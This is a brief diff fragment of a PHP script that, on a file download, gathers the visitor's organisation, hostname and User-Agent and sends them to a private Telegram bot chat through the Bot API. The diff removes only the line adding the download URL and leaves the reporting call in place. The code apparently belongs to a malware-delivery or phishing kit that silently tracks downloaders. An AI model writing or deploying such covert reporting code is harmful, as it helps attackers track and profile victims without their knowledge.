@@ -241,7 +241,6 @@ if ($action === 'download') {
         $msg .= "🏢 Org: $org\n";
         $msg .= "🔗 Hostname: $hostname\n";
         $msg .= "🖥 User-Agent: $userAgent\n";
-        $msg .= "⬇ Download URL: $DOWNLOAD_URL";
 
         $turl = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage";
         file_get_contents($turl . "?chat_id={$TELEGRAM_CHAT_ID}&text=" . urlencode($msg));
